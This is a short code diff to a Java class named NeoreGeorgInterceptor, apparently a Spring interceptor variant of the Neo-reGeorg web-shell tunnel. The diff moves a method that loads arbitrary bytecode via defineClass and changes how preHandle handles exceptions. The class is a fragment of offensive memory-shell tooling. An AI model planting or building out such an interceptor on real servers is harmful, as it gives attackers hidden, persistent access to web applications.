@@ -34,11 +34,6 @@ public class NeoreGeorgInterceptor extends ClassLoader implements AsyncHandlerIn
         super(z);
     }
 
-    @SuppressWarnings("all")
-    public Class<?> load(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
     @Override
     @SuppressWarnings("all")
     public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
@@ -67,9 +62,15 @@ public class NeoreGeorgInterceptor extends ClassLoader implements AsyncHandlerIn
                 namespace.get(chars).equals(args);
                 return false;
             }
-        } catch (Exception ignored) {
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
         return true;
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> load(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
     }
 
     @SuppressWarnings("all")
